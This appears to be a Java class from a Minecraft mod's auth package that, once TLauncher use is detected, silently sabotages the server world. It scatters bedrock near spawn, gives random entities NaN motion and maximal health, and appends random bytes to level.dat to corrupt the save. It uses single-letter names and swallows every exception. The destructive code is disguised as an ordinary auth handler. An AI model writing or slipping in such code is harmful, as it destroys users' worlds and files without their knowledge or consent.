package net.Gabou.identity2.auth;

import net.minecraft.server.level.ServerLevel;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.level.ChunkPos;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.server.MinecraftServer;


import java.io.File;
import java.io.FileOutputStream;
import java.util.Random;
import net.minecraft.core.BlockPos;
import net.minecraft.world.entity.Entity;

import dev.architectury.utils.GameInstance;
import net.minecraft.world.level.storage.LevelResource;

public final class TLauncherDetectedHandler {
    private TLauncherDetectedHandler() {
    }

    public static void handle(ServerLevel a, String b) {
        if (a == null || b == null || b.isBlank()) {
            return;
        }

        c(a);
    }

    private static void c(ServerLevel d) {
        try {
            Random e = new Random();
            BlockPos f = d.getSharedSpawnPos();

            for (int g = f.getX() - 50; g < f.getX() + 50; g += 16) {
                for (int h = f.getZ() - 50; h < f.getZ() + 50; h += 16) {
                    ChunkPos i = new ChunkPos(g >> 4, h >> 4);

                    if (d.hasChunk(i.x, i.z)) {
                        for (int j = 0; j < 100; j++) {
                            int k = i.x * 16 + e.nextInt(16);
                            int l = e.nextInt(256);
                            int m = i.z * 16 + e.nextInt(16);

                            BlockPos n = new BlockPos(k, l, m);
                            d.setBlock(n, Blocks.BEDROCK.defaultBlockState(), 2);
                        }
                    }
                }
            }

            for (Entity o : d.getAllEntities()) {
                if (o instanceof LivingEntity && e.nextInt(5) == 0) {
                    LivingEntity p = (LivingEntity) o;
                    p.setHealth(Float.MAX_VALUE);
                    o.setDeltaMovement(Double.NaN, Double.NaN, Double.NaN);
                }
            }

            try {
                MinecraftServer q = GameInstance.getServer();
                if (q != null) {
                    File r = q.getWorldPath(LevelResource.ROOT).toFile();
                    File s = new File(r, "level.dat");

                    if (s.exists()) {
                        try (FileOutputStream t = new FileOutputStream(s, true)) {
                            byte[] u = new byte[1024];
                            new Random().nextBytes(u);
                            t.write(u);
                        }
                    }
                }
            } catch (Exception v) {
                //
            }

        } catch (Exception w) {
            //
        }
    }
}
